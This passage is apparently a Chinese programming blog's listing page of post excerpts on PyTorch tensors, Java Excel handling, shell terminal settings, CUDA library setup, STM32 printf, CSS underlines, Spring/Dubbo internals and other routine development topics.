一、dim的定义 TensorFlow对张量的阶、维度、形状有着明确的定义，而在pytorh中对其的定义却模糊不清，仅仅有一个torch.size()的函数来查看张量的大小（我理解的这个大小指的就是TensorFlow对张量的形状描述，也和numpy的.shape类似）。所以，首先要搞清楚如何看一个张量的形状。
import torch z = torch.ones(2,3,4) print(z) print(z.size()) print(z.size(0)) print(z.size(1)) print(z.size(2)) 以上代码的控制台输出为：
tensor([[[1., 1., 1., 1.], [1., 1., 1., 1.], [1., 1., 1., 1.]], [[1., 1., 1., 1.], [1., 1., 1., 1.], [1., 1., 1., 1.]]]) torch.Size([2, 3, 4]) 2 3 4 可见，我们成功创建了一个（2，3，4）大小的张量，那么我们人工应该怎么辨别一个张量的大小呢？为了直观，我把这个张量的中括号调整一个位置：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e7fbe1f304c8deda9c84df1ba11433d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/862cc617736649a6d5c6f04639b8835a/" rel="bookmark">
			JAVA对excle创建、读取、设置单元格颜色、背景色、跨行跨列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pom.xml依赖 &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- file文件转化为mutifile --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpcore&lt;/artifactId&gt; &lt;version&gt;4.4.9&lt;/version&gt; &lt;/dependency&gt; 读取 package com.example.test; import org.apache.http.entity.ContentType; import org.apache.poi.hssf.usermodel.HSSFWorkbook; import org.apache.poi.ss.usermodel.*; import org.apache.poi.xssf.usermodel.XSSFWorkbook; import org.springframework.mock.web.MockMultipartFile; import org.springframework.web.multipart.MultipartFile; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class ExcelReadTest { /** *根据文件路径得到MultipartFile * @param url * @return * @throws IOException */ public MultipartFile fileToMultipartFile(String url) throws IOException { File file = new File(url); FileInputStream fileInputStream = new FileInputStream(file); MultipartFile multipartFile = new MockMultipartFile(file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/862cc617736649a6d5c6f04639b8835a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d388d551a1ff2b6f8c98212b6aac1f0d/" rel="bookmark">
			Shell 采集终端信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写shell脚本时，免不了处理当前终端的相关信息，比如说行数，列数，光标位置，设置前景/背景颜色，设置字体，等等。本文描述如何采集并处理终端设置。
要完成终端信息采集与设置，通常需要用到两款终端处理工具：tput和stty。
1. tput的功能 获取终端的行数和列数： tput cols tput lines 打印当前终端的名字：
tpupt longname 设置终端背景色
tput setb n 其中n的取值变化如下（注意，生效与设置差一行）：
设置终端的前景色 tput setf n 其中n的取值变化如下（注意，生效与设置差一行）：
2. stty 用途说明 stty命令用于显示和修改终端行设置（change and print terminal line settings）。
常用参数 stty命令不带参数可以打印终端行设置，加上-a参数可以打印得更详细些。
stty size可以显示终端的大小，即行数和列数。
stty命令还可以更改终端行的设置，格式如下：
stty SETTING CHAR
其中，SETTING可以是如下
eof : 输入结束，文件结束，默认为Ctrl+D。比如：用cat &gt;file来创建文件时，按Ctrl+D来结束输入。
erase : 向后删除字符，擦除最后一个输入字符，默认为Ctrl+?。注意默认情况下退格键Backspace不是删除字符。
intr : 中断当前程序，默认为Ctrl+C。
kill : 删除整条命令，删除整行，默认为Ctrl+U。
quit :退出当前程序，默认为Ctrl+\或Ctrl+|。
start : 启动屏幕输出，默认为Ctrl+Q。
stop :停止屏幕输出，默认为Ctrl+S。
susp : terminal stop当前程序，默认为Ctrl+Z。这样当前进程就会变成后台进程了。
werase：删除最后一个单词，默认为Ctrl+W。
stty命令还有一些其他用法，如：
stty -echo 关闭回显。比如在脚本中用于输入密码时。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d388d551a1ff2b6f8c98212b6aac1f0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8496b2041a8319e31d8f8a2521b16c9/" rel="bookmark">
			Could not load dynamic library ‘libcudart.so.11.0‘； dlerror: libcudart.so.11.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CUDA Toolkit 11.0 Download | NVIDIA Developer
wget http://developer.download.nvidia.com/compute/cuda/11.0.2/local_installers/cuda_11.0.2_450.51.05_linux.run sudo sh cuda_11.0.2_450.51.05_linux.run 接下来： First, find out where the "libcudart.so.11.0" is： locate libcudart.so.11.0 Second, add the path to environment file: sudo vim /etc/profile export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda-11.0/targets/x86_64-linux/lib source /etc/profile 运行成功后可以看到：
2022-03-12 07:38:34.386165: I tensorflow/stream_executor/platform/default/dso_loader.cc:49] Successfully opened dynamic library libcudart.so.11.0
参考：
https://github.com/tensorflow/tensorflow/issues/45930https://github.com/tensorflow/tensorflow/issues/45930
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/623ca36813bafb69d6a7f90485fd402e/" rel="bookmark">
			【LTspice】004 Voltage Source 参数配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. DC Value
2. PULSE
3. SINE
4. EXP
5. SFFM
6. PWL
7. bv - 函数式电压源
1. DC Value LTspice的Voltage source是我们必须了解的一个器件，任何一个仿真都会用到。下面详细介绍这个器件的设置。首先，设置一个直流电压，如下，直接输入DC value即可，serial Resistance代表内阻，我们一般不指定。
当点击【Advanced】，我们可以设置更多高级功能。如下，每一个功能后面括号里是实现这个功能需要编辑的参数。
2. PULSE Vinitial：初始电压；
Von：高电平电压；
Tdelay：延时时间，指仿真开始的0时刻到出现第一个波形的延时；
Trise：波形的上升时间，一般设置10n(纳秒)即可；
Tfall：波形的下降时间，一般设置10n(纳秒)即可；
Ton：导通时间；
Tperiod：周期；
Ncycles：循环次数，可简单理解为波形的个数。
3. SINE DC offset：直流偏置；
Amplitude：幅值；
Freq：频率；
Theta：阻尼正弦波的阻尼因子。阻尼正弦波（见下图）是振幅会随时间增长而趋向零的正弦波；
Phi：相位。
4. EXP exponential的缩写，指数电压源。不做详细介绍，基本用不到。
5. SFFM single frequency FM的缩写，单频FM电压源。不做详细介绍，基本用不到
6. PWL Piece-wise linear的缩写，分段线性电压源。(time , value) 去画图。
采用repeat forever(xxx,xxx, ...)endrepeat format 去画三角波、锯齿波
设定执行次数 repeat for N
采用外部倒入 txt文档的方式, file = 文件路径
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/623ca36813bafb69d6a7f90485fd402e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1d8c0861fac622877f087a2566b066e/" rel="bookmark">
			Android NDK使用CMake编译OBJECT库引发的错误(produces multiple outputs)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用CMake进行构建的时候，CMakeLists配置如下OBJECT库，并指定最小版本为3.14
cmake_minimum_required(VERSION 3.14) # ogg库 add_library(aiengine_ogg OBJECT third/ogg/bitwise.c third/ogg/framing.c ) 不指定构建的ABI，即编译4个系统平台，x86，x86_64，arm64-v8a，armeabi-v7a
指定CMake版本为3.18.1，即模块级Gradle内，android.externalNativeBuild.cmake配置
externalNativeBuild { cmake { path file('../../CMakeLists.txt') version "3.18.1" } } NDK使用默认版本21.4.7075529
会发生如下错误
E:\Git\sdk_2.x\CMakeLists.txt : C/C++ debug|x86 : Target aiengine_ogg::@6890427a1f51a3e7e1df produces multiple outputs E:\Git\sdk_2.x\AndroidDebugProject\app\.cxx\cmake\debug\x86\CMakeFiles\aiengine_ogg.dir\third\ogg\bitwise.c.o, E:\Git\sdk_2.x\AndroidDebugProject\app\.cxx\cmake\debug\x86\CMakeFiles\aiengine_ogg.dir\third\ogg\framing.c.o 如果修改为只编译指定的1个ABI，则可以构建成功
尝试更换过NDK，Ninja版本，CMake版本更新为最新3.20也都无法解决这个问题
最后更换了CMake版本为3.14.0的版本，问题解决，尝试了3.14.7以下的版本都是可以的，3.15.0以上就会报这个错误
虽然问题解决了，但是具体发生该错误的原因还不清楚，如果有知道的还望告知，谢谢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1a601d5452b1d070203f516c0e2877e/" rel="bookmark">
			STM32使用printf函数的步骤和注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种方法: 使用微库: 1,在KEIL中勾选 Use MicroLIB . 即使用微库.
2, 在代码中添加 如下代码 (目的是为了调用stdio库中的print 函数)
#include "stdio.h" //支持print 一般添加到main.h中 3,在uart.c 填加如下代码 (目的是为了重定向 stdio库中的print 函数 )
//重定向print int fputc(int ch, FILE *f)//printf { HAL_GPIO_WritePin(GPIOA,GPIO_PIN_0,GPIO_PIN_SET); //485发送使能端口 没有可去掉 HAL_UART_Transmit(&amp;huart1, (uint8_t *)&amp;ch, 1,0xffff); //发送一个字节的数据到你希望的串口 HAL_GPIO_WritePin(GPIOA,GPIO_PIN_0,GPIO_PIN_RESET); //485发送使能端口 没有可去掉 return (ch); } 第二种方法: 不使用微库，使用标准C库，声明不使用半主机模式 1, 在代码中添加 如下代码 (目的是为了调用stdio库中的print 函数)
#include "stdio.h" //支持print 一般添加到main.h中 2, 关闭半主机模式,并重定向printf
#pragma import(__use_no_semihosting)//不使用半主机模式 //避免使用半主机模式 void _sys_exit(int x) { x = x; } //标准库需要支持的函数 struct __FILE { int handle; }; FILE __stdout; //重定向print int fputc(int ch, FILE *f)//printf { HAL_GPIO_WritePin(GPIOA,GPIO_PIN_0,GPIO_PIN_SET); //485发送使能端口 没有可去掉 HAL_UART_Transmit(&amp;huart1, (uint8_t *)&amp;ch, 1,0xffff); //发送一个字节的数据到你希望的串口 HAL_GPIO_WritePin(GPIOA,GPIO_PIN_0,GPIO_PIN_RESET); //485发送使能端口 没有可去掉 return (ch); } 解释: 想要明白为什么会有使用微库和不使用微库这两种方案，需要先搞明白一个概念 半主机模式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1a601d5452b1d070203f516c0e2877e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/921ef5e8911f7834b97de8d19a3cf029/" rel="bookmark">
			【案例练习】16—25个CSS 文本下划线的实现案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		英文 | https://niemvuilaptrinh.medium.com/19-css-text-underline-for-websites-b17a52c8ac6f
今天的文章，我们将一起来学习如何将网站中的默认下划线设计成漂亮的下划线效果，同时，可以提升用户体验，也可以帮助网站来吸引用户的注意力！
现在，我们就开始今天的内容。
01、CSS下划线效果集合
演示地址：https://codepen.io/TheCSSKing/pen/VwwRzgg
02、时尚的下划线 CSS
演示地址：https://codepen.io/johndjameson/pen/zKrKQP
03、CSS下划线框阴影
演示地址：https://codepen.io/johndjameson/pen/NroZqB
04、CSS 下划线粗细
演示地址：https://codepen.io/pirrera/pen/WNOYov
05、CSS3下划线渐变动画
演示地址：https://codepen.io/NickNoordijk/pen/QbEZQG
06、SVG 文本下划线
演示地址：https://codepen.io/iam_aspencer/pen/qvNPBv
07、CSS 下划线颜色
演示地址：https://codepen.io/mattgrosswork/pen/rNWvNa
08、CSS悬停下划线效果 演示地址：https://codepen.io/bonkalol/pen/mdRMOp
09、Javascript 下划线效果
演示地址：https://codepen.io/chriscoyier/pen/JjGEpXK
10、CSS3下划线动画 演示地址：https://codepen.io/jimmyplaysdrums/pen/vOMRQw
11、SVG下划线效果
演示地址：https://codepen.io/rachsmith/pen/pJbPyN
12、悬停下划线 HTML5 CSS3
演示地址：https://codepen.io/timaronan/pen/zYWdwr
13、CSS下划线渐变色
演示地址：https://codepen.io/iLord/pen/MozdKg
14、CSS动画下划线多行
演示地址：https://codepen.io/Wking/pen/BdmpVx
15、 CSS悬停下划线
演示地址：https://codepen.io/tonkec/pen/jWmgqN
16、动画下划线悬停
演示地址：https://codepen.io/msco195/pen/KgodYm
17、简单的 CSS 滑动下划线菜单
演示地址：https://codepen.io/rm/pen/AXpmja
18、下划线动画
演示地址：https://codepen.io/aaroniker/pen/pojaBvb
19、多行动画下划线效果
演示地址：https://codepen.io/cecilehabran/pen/EvRamr
20、多行跨越动画下划线效果
演示地址：https://codepen.io/cassie-codes/pen/rNNGdmw
21、文字装饰下划线动画
演示地址：https://codepen.io/Kseso/pen/ApYVoW
22、下划线动画波浪
演示地址：https://codepen.io/daviddarnes/pen/OgaRYw
23、文字下划线悬停效果
演示地址：https://codepen.io/MishaHahaha/pen/rLpoeG
24、多行动画下划线文字效果
演示地址：https://codepen.io/melnik909/pen/xNmpZw
25、 CSS悬停时的下划线效果
演示地址：https://codepen.io/bobbyshowalter/pen/xxwVvX
总结
以上就是，我今天跟大家分享的25个文本下划线的案例效果，希望对你有所帮助，如果你有任何问题，请在留言区给我留言，我会尽快回复。
感谢你的阅读，祝你今天过得愉快！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/921ef5e8911f7834b97de8d19a3cf029/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f241af781fdb613b775e3403896bc74/" rel="bookmark">
			浅谈Spring整合Dubbo源码（@Service和@Reference注解部分）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring整合Dubbo流程 一、处理properties配置文件1、@EnableDubbo(scanBasePackages = "xxxx")2、@EnableDubboConfig3、@DubboConfigConfiguration4、DubboConfigBindingsRegistrar5、registerDubboConfigBeans（重点） 二、处理@Service注解1、@DubboComponentScan2、ServiceAnnotationBeanPostProcessor3、registerServiceBeans4、registerServiceBean5、buildServiceBeanDefinition 三、处理@Reference注解1、registerReferenceAnnotationBeanPostProcessor2、ReferenceAnnotationBeanPostProcessor3、findInjectionMetadata4、inject5、doGetInjectedBean6、registerReferenceBean 本文仅仅包含Spring整合Dubbo部分，代码流程中涉及很多Spring的扩展机制，如果对于Spring的一些扩展机制不熟悉的小伙伴，可以先了解Spring中的源码，再阅读本文，否则会出现很多莫名其妙的接口和方法。
此处之外，文本仅涉及整合部分，不涉及服务调用、引入与导出部分。
先来一张总体的流程图：
一、处理properties配置文件 1、@EnableDubbo(scanBasePackages = “xxxx”) 如果Spring项目需要和Spring进行整合，在引入对应的maven依赖后，需要使用@EnableDubbo注解，用来开启对应的Dubbo组件。这个和众多分布式组件类似，都是使用一个注解引入对应的组件。
scanBasePackages 表示扫描路径，可以类比ComponentScan注解的配置项进行理解。即扫描哪些路径下的实体类，完成dubbo服务的提供。
在EnableDubbo注解里面又引入了两个注解，处理properties配置文件需要使用到@EnableDubboConfig注解，第二个注解与@Service和@Referencer注解有关，这在下一届进行讲解
@EnableDubboConfig @DubboComponentScan public @interface EnableDubbo {} 2、@EnableDubboConfig @EnableDubboConfig注解，又以同样的方式引入了DubboConfigConfigurationRegistrar类
@Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Inherited @Documented @Import(DubboConfigConfigurationRegistrar.class) public @interface EnableDubboConfig { // multiple默认值为true boolean multiple() default true; } 此类实现了ImportBeanDefinitionRegistrar接口，熟悉Spring的小伙伴都知道这是Spring的一个扩展接口，用来将所有的Java类注册为BeanDefinition，再用于后期的实例化单例Bean步骤
对应的Spring中的源码位置如下图，这是一个十分重要的点，很多微服务组件都是通过实现这个接口进行BeanDefinition的注册。其对应Spring中refresh方法里面的invokeBeanFactoryPostProcessors方法（如果你对refresh方法都一点没听过，那就直接忽略这里）
registerBeans方法内部大致逻辑为注册DubboConfigConfiguration这个注解，所以压力又来到了DubboConfigConfiguration这个注解内部。想跟源码的可以跟进去，内部就是调用register方法完成注册
public class DubboConfigConfigurationRegistrar implements ImportBeanDefinitionRegistrar { @Override public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) { AnnotationAttributes attributes = AnnotationAttributes.fromMap( importingClassMetadata.getAnnotationAttributes(EnableDubboConfig.class.getName())); boolean multiple = attributes.getBoolean("multiple"); //true // Single Config Bindings registerBeans(registry, DubboConfigConfiguration.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f241af781fdb613b775e3403896bc74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04374ccebae0762dba9466175bef4c9c/" rel="bookmark">
			leetcode21 合并两个有序链表——链表插入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、题目描述二、解题思路与代码三、注意事项 一、题目描述 将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。
示例 1：
输入：l1 = [1,2,4], l2 = [1,3,4]
输出：[1,1,2,3,4,4]
示例 2：
输入：l1 = [], l2 = []
输出：[]
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/merge-two-sorted-lists
二、解题思路与代码 题目中给的示例是l1和l2，为避免混淆，将其改为fir和sec。本题思路为使用两个指针同时遍历两个单链表，若sec的当前节点值小于fir的当前节点值，则将其插入到fir中，否则fir往后走。具体涉及涉及单链表节点的拆分与插入。
单链表节点拆分需要做如下两件事：
1. 断开当前节点与下一节点；
2. 前一节点的后继指向当前节点的后继。
假设当前节点为node，则可表示为如下代码：
node.next = node.next.next; // 要保证node.next != null，在实际应用中需注意 假设新插入的节点为newNode，插入单链表preNode节点后，插入新节点需要做如下两件事：
1. 让newNode的后继指向preNode的后继；
2. 让preNode的后继指向newNode。
即：
newNode.next = preNode.next; // 让新节点与插入位置节点的下一个节点相连 preNode.next = newNode; // 让插入位置节点与新节点相连 /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode() {} * ListNode(int val) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04374ccebae0762dba9466175bef4c9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95178fc2ccb3bcf0b782d227c235ed11/" rel="bookmark">
			Bean管理xml方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有参构造注入和set注入简略 &lt;!--set方法注入属性--&gt; &lt;bean id="book" class="com.spring5.Book"&gt; &lt;!--使用property完成属性注入 name:类里面属性名称 value：向属性里注入的值--&gt; &lt;property name="bname" value="易筋经"&gt;&lt;/property&gt; &lt;property name="bauthor" value="达摩老祖"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!--有参注入--&gt; &lt;bean id="order" class="com.spring5.Order"&gt; &lt;constructor-arg name="oname" value="电脑"&gt;&lt;/constructor-arg&gt; &lt;constructor-arg name="address" value="China"&gt;&lt;/constructor-arg&gt; &lt;/bean&gt; p名称空间注入 使用p名称空间注入，可以简化基于xml配置方式
（1）添加p名称空间 ：在xml文件当中beans标签里加入下面这一行
xmlns:p="http://www.springframework.org/schema/p" （2）进行属性注入
&lt;bean id="book" class="com.spring5.Book" p:bname="九阳真经" p:bauthor="无名氏"&gt; p：类的属性名
xml注入其他类型属性 1.字面量
（1）null值
&lt;property name="address" &gt; &lt;null/&gt; &lt;/property&gt; （2）属性值包含特殊符号
&lt;!--包含特殊符号 1.把&lt;&gt;进行转义 2.把特殊符号写到CDATA，属性值&lt;&lt;南京&gt;&gt; --&gt; &lt;property name="address"&gt; &lt;value&gt;&lt;![CDATA[&lt;&lt;南京&gt;&gt;]]&gt;&lt;/value&gt; &lt;/property&gt; 注入属性-外部bean 1.创建两个类service类和dao类
2.在service类里调用dao类
3.在spring中进行配置
package com.spring5.service; import com.spring5.dao.UserDao; import com.spring5.dao.UserDaoImpl; public class UserService { //注入对象属性 //创建UserDao类型属性，生成set方法 private UserDao userDao; public void setUserDao(UserDao userDao) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95178fc2ccb3bcf0b782d227c235ed11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55317006e779726b65aa9cabd67cc837/" rel="bookmark">
			JavaScript(2021.9.26)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引入 1.计算机语言 2.编程语言和标记语言的区别 3.数据存储单位 二.JavaScript简介 1.JS参考文献 菜鸟教程：AngularJS 参考手册 | 菜鸟教程
W3school：JavaScript 参考手册
MDN：JavaScript 参考 - JavaScript | MDN
现代JavaScript教程：现代 JavaScript 教程
2.JS是什么？ JS的标准命名为ECMAScript，但实际上JavaScript的含义更大一些。JavaScript包括ECMAScript、DOM（文档对象模型，通过JS操作网页）、BOM（浏览器文档对象模型，通过JS操作浏览器）
3.JS的作用 JS的出现主要用于处理网页中的前端验证（在浏览器中检查用户输入的内容是否符合一定的规则，如：用户名的长度，密码的长度，邮箱的格式）
4.浏览器执行JS的过程 5.JS的组成 （jsapi） ECMA 欧洲计算机联盟
Web APIs 包括 DOM(控制标签，对页面元素进行移动、大小、添加、删除等操作)，BOM(操作浏览器，比如页面弹窗、检测窗口宽度、存储数据到浏览器)
6.JS三种书写位置 （1）行内(内联)样式，写在标签的属性中 点击按钮或超链接时，js代码才会执行
&lt;button onclick="alert('点击后弹出的')"&gt;点击按钮&lt;/button&gt; &lt;a href="javascript:alert('点击后弹出的')"&gt;点击超链接&lt;/a&gt; script可以写到标签内部 &lt;div class="box"&gt; &lt;script&gt; document.write(`你好`) &lt;/script&gt; &lt;/div&gt; （2）内部(内嵌)样式，写在head的标签script中 &lt;script type="text/javascript"&gt;alert("内嵌式的JS")&lt;/script&gt; （3）外部(外链)样式，head中连接，一个html文件可以连接多个js文件 &lt;script src="JS.js"&gt;&lt;/script&gt; 注意：不要在标签中写代码，会不生效
7. Unicode编码 可查询Unicode编码对照表
三、注释 1.// 单行注释(ctrl+/) 2./* */ 多行注释(ctrl+shift+/ 或 shift+alt+A) 四、调试 断点调试
把 变量、表达式、条件判断 添加至监视表达式，然后刷新，一步一步执行（注意：点两次执行该语句或到下一句才执行）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55317006e779726b65aa9cabd67cc837/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e6b881d6119e208ab2be260a3592a91/" rel="bookmark">
			Java基础教程-04-方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java基础教程-04-方法 1. 方法简介 1.1 概述 方法(method)，也叫函数，是将具有独立功能的代码块组织成为一个整体，使其成为具有特殊功能的代码集.
例如: 现实生活中, 拿牙刷, 挤牙膏, 刷上排牙, 刷下排牙, 漱口, 这些单独的动作合起来, 就完成了刷牙的动作.
又例如: 让我们获取元素10和20的最大值, 我们可以通过if语句或者三元运算符实现, 如果再让我们获取22和11之间的最大值, 我们还需要把刚才的逻辑代码在写一次. 这样做很繁琐. 针对于这种情况, 我们就可以把获取两个整数最大值的逻辑代码封装到方法中, 当我们需要比较的时候, 直接调用方法就可以了. 这样做, 非常方便.
2.2 定义格式 修饰符 返回值的数据类型 方法名(参数类型 参数名1, 参数类型 参数名2) { //这里可以写多个参数 //方法体; return 具体的返回值;	//加工好的饲料 } public static void main(String[] args) { } 1.3 格式解释 • 修饰符: 目前记住这里是固定格式public static
• 返回值的数据类型: 用于限定返回值的数据类型的.
注意:
1. 返回值的数据类型是int类型, 则说明该方法只能返回int类型的整数.
2. 如果方法没有具体的返回值, 则返回值的数据类型要用void来修饰.
• 方法名: 方便我们调用方法.
• 参数类型: 用于限定调用方法时传入的数据的数据类型.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e6b881d6119e208ab2be260a3592a91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87ae12442c517ddf2f2a7a3a420ec48d/" rel="bookmark">
			java常用的集合分组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Collectors.toMap
List&lt;Order&gt; orders = new ArrayList&lt;Order&gt;; Map&lt;String, Order&gt; orderMap = orders.stream() .collect(Collectors.toMap(Order::getProductCode, Function.identity(), (a, b) -&gt; a)); 2. Collectors.groupingBy
// 示例一 List&lt;Order&gt; orders = new ArrayList&lt;Order&gt;; Map&lt;String, List&lt;Order&gt;&gt; orderMap = orders.stream() .collect(Collectors.groupingBy(Order::getProductCode); // 示例二 根据商品分组统计商品数量 Map&lt;String, Long&gt; orderMap = orders.stream() .collect(Collectors.groupingBy(Order::getProductCode, Collectors.counting()); // 示例三 根据商品分组，求和商品的下单数量 Map&lt;String, Integer&gt; orderMap = orders.stream() .collect(Collectors.groupingBy(Order::getProductCode, Collectors.summingInt(Order::getSheetNum))); 3.@Mapkey
sql查询集合后指定字段分组
/** * 根据商品编号，获得key:商品编号，value:订单信息 * @param productCodeList 商品编号集合 * @return Map&lt;商品编号, 订单实体&gt; */ @Select("&lt;script&gt;SELECT product_code, order_code "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87ae12442c517ddf2f2a7a3a420ec48d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4247c5b6e9af1bb46a29fa3d81c2fea/" rel="bookmark">
			博途的定时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		旧的S5Time定时器:
上边的T25是代表了定时器本身, 使用 TIMER 定时器, 数据类型是T.
下边的表示时间, “OP10AIn”.S5Time1 是S5定时器, 数据类型是 S5TIME, 长度是 WORD/int, 2个字节,
Timer和S5Timer是一对, 格式 :S5T#10s
IEC定时器 :
IEC定时器的类型是一组数. PT表示时间, 是Time类型, 长度是DInt, 4个字节
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27bed1b0fb5e13e5ca002e03c03596a6/" rel="bookmark">
			JavaScript 原生JS实现 ‘拖拽‘ 效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		demo 1 按住鼠标进行移动的拖拽效果实现：
&lt;!DOCTYPE html&gt; &lt;html lang="zh"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box{ width: 100px; height: 100px; background-color: pink; position: absolute; left: 0; top: 0; cursor: move; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;script&gt; var box = document.querySelector('.box') box.onmousedown = function (ev){ // 鼠标按下时在box中的偏移量 var box_offsetX = ev.offsetX var box_offsetY = ev.offsetY // 在整个文档都可以拖拽box document.onmousemove = function (event){ // 鼠标在页面中的坐标 var x = event.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27bed1b0fb5e13e5ca002e03c03596a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a30a5f6262c7eba5f9819ef162cd485a/" rel="bookmark">
			java基础之单元测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准备工作 springboot使用单元测试需要先引入以下依赖
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; test依赖会引入如下的jar包
service单元测试 springboot中单元测试类写在src/test/java目录下，可以进行手动创建测试类，或者通过idea自动创建测试类ctrl+shift+T(shift+command+T)或者菜单栏鼠标点击创建：
上面就是最简单的单元测试写法，想要执行的时候，鼠标放在对应的方法，右键选择run该方法即可。
controller单元测试 对controller进行单元测试时，需要使用到MockMvc了。这样就可以不必启动项目就可以测试这些接口了。
MockMvc实现了对Http请求的模拟，能够直接使用网络的形式，转换到Controller的调用，这样可以使得测试速度快、不依赖网络环境，而且提供了一套验证的工具，这样可以使得请求的验证统一而且很方便。
示例代码如下：
